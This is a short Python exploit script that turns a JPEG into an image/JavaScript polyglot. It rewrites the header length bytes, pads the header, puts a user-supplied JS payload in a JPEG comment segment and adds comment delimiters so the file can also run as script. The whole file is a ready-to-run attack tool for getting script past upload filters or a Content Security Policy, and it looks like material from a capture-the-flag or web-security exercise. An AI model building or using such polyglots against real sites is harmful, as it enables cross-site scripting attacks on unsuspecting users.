from pwn import *

with open('cutie.jpg', 'rb') as f:
    d = f.read()

payload = b"*/=" + input("JS Payload: ").encode() + b"/*"



# Magic bytes.
out = d[:4]

# Header size
out += b"\x2f\x2a"

# Old Header + Null bytes for padding, We can include our payload here too.
pad = 0x2F2A - len(d[4+2:4+16])
out += d[4+2:4+16] + b"\x00" * pad

# Comment section
out += b"\xff\xfe"

# Comment section size = Size of our payload
out += bytes.fromhex(hex(len(payload))[2:].rjust(4, "0"))

# Payload
out += payload

# Rest of the file
out += d[4+16:-2 -4]

# Close multiline comment & add a single line comment for the next bytes.
out += b"*///"

# End of image bytes.
out += b"\xff\xd9"

print("[*] Generated output.jpg")
print("[*] Use with 'ISO-8859-1' encoding")
with open('output.jpg', 'wb') as f:
    f.write(out)

